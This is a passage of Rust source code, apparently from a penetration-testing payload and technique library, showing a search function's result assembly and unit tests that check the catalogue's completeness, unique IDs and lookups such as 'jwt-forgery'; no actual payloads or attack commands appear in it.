    let mut matched_sets = Vec::new();
    for set in payload_sets() {
        let set_matches = set.id.to_lowercase().contains(&q)
            || set.title.to_lowercase().contains(&q)
            || set.when_to_use.to_lowercase().contains(&q);
        let matching: Vec<Payload> = set
            .payloads
            .iter()
            .filter(|p| {
                p.value.to_lowercase().contains(&q)
                    || p.description.to_lowercase().contains(&q)
                    || p.tag.to_lowercase().contains(&q)
            })
            .cloned()
            .collect();
        if set_matches || !matching.is_empty() {
            matched_sets.push(PayloadSet {
                id: set.id.clone(),
                title: set.title.clone(),
                when_to_use: set.when_to_use.clone(),
                payloads: if set_matches {
                    set.payloads.clone()
                } else {
                    matching
                },
            });
        }
    }

    let matched_techniques: Vec<Technique> = techniques()
        .into_iter()
        .filter(|t| {
            t.id.to_lowercase().contains(&q)
                || t.title.to_lowercase().contains(&q)
                || t.domain.to_lowercase().contains(&q)
                || t.concept.to_lowercase().contains(&q)
                || t.steps.iter().any(|s| s.to_lowercase().contains(&q))
        })
        .collect();

    SearchResult {
        query: query.to_string(),
        payload_sets: matched_sets,
        techniques: matched_techniques,
    }
}

/// Result of [`search`].
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct SearchResult {
    /// The original query.
    pub query: String,
    /// Matching payload sets.
    pub payload_sets: Vec<PayloadSet>,
    /// Matching techniques.
    pub techniques: Vec<Technique>,
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn payload_library_is_complete() {
        let lib = payload_sets();
        assert!(lib.len() >= 18);
        for set in &lib {
            assert!(!set.payloads.is_empty(), "empty set: {}", set.id);
            for payload in &set.payloads {
                assert!(!payload.value.is_empty(), "empty payload in {}", set.id);
                assert!(payload.difficulty <= 5);
            }
        }
    }

    #[test]
    fn payload_set_ids_are_unique() {
        let mut ids: Vec<String> = payload_sets().into_iter().map(|s| s.id).collect();
        let before = ids.len();
        ids.sort();
        ids.dedup();
        assert_eq!(before, ids.len(), "duplicate payload set ids");
    }

    #[test]
    fn technique_lookup_by_id() {
        let t = technique("jwt-forgery").expect("jwt-forgery should exist");
        assert_eq!(t.domain, "Authentication");
        assert!(t.related_payload_sets.contains(&"jwt".to_string()));
    }

    #[test]
    fn search_hits_both_sections() {
        let result = search("union");
        assert!(!result.payload_sets.is_empty(), "union should hit payloads");

        let result = search("template");
        assert!(
            !result.techniques.is_empty(),
            "template should hit techniques"
        );
    }

    #[test]
    fn domains_are_populated() {
        let domains = technique_domains();
        assert!(domains.contains(&"Injection".to_string()));
        assert!(domains.contains(&"Authentication".to_string()));
    }

    #[test]
    fn all_related_payload_sets_resolve() {
        for t in techniques() {
            for related in &t.related_payload_sets {
                assert!(
                    payload_set(related).is_some(),
                    "technique {} references missing payload set {}",
                    t.id,
                    related
                );
            }
        }
    }
}
